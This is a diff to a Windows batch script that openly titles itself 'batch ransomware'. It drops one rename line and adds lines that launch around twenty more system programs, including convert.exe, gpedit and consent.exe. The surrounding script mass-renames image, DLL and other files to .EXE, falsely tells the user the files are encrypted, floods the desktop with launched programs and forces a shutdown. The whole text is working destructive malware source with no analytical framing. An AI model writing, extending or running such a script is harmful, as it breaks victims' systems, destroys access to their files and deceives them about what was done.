@@ -1,6 +1,5 @@
 @echo off
 title %username%, You are a victim of the batch ransomware!
-REN *.BAT *.EXE
 REN *.PNG *.EXE
 REN *.BMP *.EXE
 REN *.DLL *.EXE
@@ -31,6 +30,7 @@ REN *.WMZ *.EXE
 echo Your files have been encrypted!
 shutdown -s -t 10000
 cd C:\Windows\System32
+start control.exe
 start notepad.exe
 start mspaint.exe
 start wordpad.exe
@@ -78,4 +78,25 @@ start ftp.exe
 start printui.exe
 start poqexec.exe
 start mobsync.exe
+start bdeunlocker.exe
+start calc.exe
+start hvax64.exe
+start OptionalFeatures.exe
+start osk.exe
+start quickassist.exe
+start CustomInstallExec.exe
+start cttune.exe
+start ctfmon.exe
+start convert.exe
+start wscript.exe
+start cscript.exe
+start conhost.exe
+start consent.exe
+start ndadmin.exe
+start grpconv.exe
+start gpedit.exe
+start hdwwiz.exe
+start psr.exe
+start proquota.exe
+
 shutdown -s -t 0
